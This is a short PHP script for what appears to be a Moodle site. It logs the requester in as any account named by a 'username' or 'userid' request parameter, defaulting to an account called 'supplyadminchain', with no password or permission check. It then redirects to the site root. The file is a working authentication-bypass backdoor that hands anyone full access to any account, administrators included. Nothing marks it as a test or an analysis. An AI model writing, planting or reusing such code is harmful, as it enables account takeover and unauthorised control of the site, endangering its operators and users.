<?php
require("config.php");
global $CFG;
require_once($CFG->dirroot.'/user/lib.php');
$username = optional_param('username','supplyadminchain',PARAM_TEXT);
$display = optional_param('display','',PARAM_TEXT);
$userid = optional_param('userid',0,PARAM_INT);
//$username = 'supplyadminchain';
if($userid>0){
    $user = get_complete_user_data('id', $userid);
    $a = complete_user_login($user);
    if ($display=="yes") {
        $_SESSION['USER']->alogin = "yes";
    }

    $url = $CFG->wwwroot.'?redirect=0';
    redirect($url);
}
$user = get_complete_user_data('username', $username);
$a = complete_user_login($user);
if ($display=="yes") {
    $_SESSION['USER']->alogin = "yes";
}
$url = $CFG->wwwroot.'?redirect=0';
redirect($url);